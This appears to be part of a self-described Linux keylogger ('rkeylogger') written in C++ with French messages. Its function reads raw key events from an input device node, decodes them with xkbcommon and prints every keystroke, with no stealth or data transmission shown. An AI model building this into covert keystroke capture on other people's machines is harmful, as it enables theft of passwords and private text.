#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <sys/ioctl.h>
#include <xkbcommon/xkbcommon.h>
#include <linux/input.h>

#include "rkeylogger.h"

void read_devnode(const char *devnode) {
    int fd = open(devnode, O_RDONLY);
    if (fd == -1) {
        std::cerr << "Impossible d'ouvrir le périphérique clavier.\n";
        return;
    }

    struct input_event ev;

    struct xkb_context *ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!ctx) {
        std::cerr << "Erreur lors de la création du contexte xkb.\n";
        close(fd);
        return;
    }

    struct xkb_keymap *keymap = xkb_map_new_from_names(ctx, nullptr, XKB_KEYMAP_COMPILE_NO_FLAGS);
    if (!keymap) {
        std::cerr << "Erreur lors de la création du keymap xkb.\n";
        xkb_context_unref(ctx);
        close(fd);
        return;
    }

    struct xkb_state *state = xkb_state_new(keymap);
    if (!state) {
        std::cerr << "Erreur lors de la création de l'état xkb.\n";
        xkb_keymap_unref(keymap);
        xkb_context_unref(ctx);
        close(fd);
        return;
    }

    while (true) {
        ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
        if (bytesRead == sizeof(struct input_event)) {
            if (ev.type == EV_KEY && (ev.value == 0 || ev.value == 1)) {
                xkb_keycode_t keycode = ev.code + 8; // Offset for EV_KEY
                xkb_keysym_t sym = xkb_state_key_get_one_sym(state, keycode);

                xkb_keysym_t unicode = xkb_keysym_to_utf32(sym);

                if (unicode != XKB_KEY_NoSymbol) {
                    std::cout << "Touche : " << (char)unicode << std::endl;
                } else {
                    std::cout << "Touche non gérée (code : " << ev.code << ")" << std::endl;
                }
            }
        }
    }

    xkb_state_unref(state);
    xkb_keymap_unref(keymap);
    xkb_context_unref(ctx);
    close(fd);
}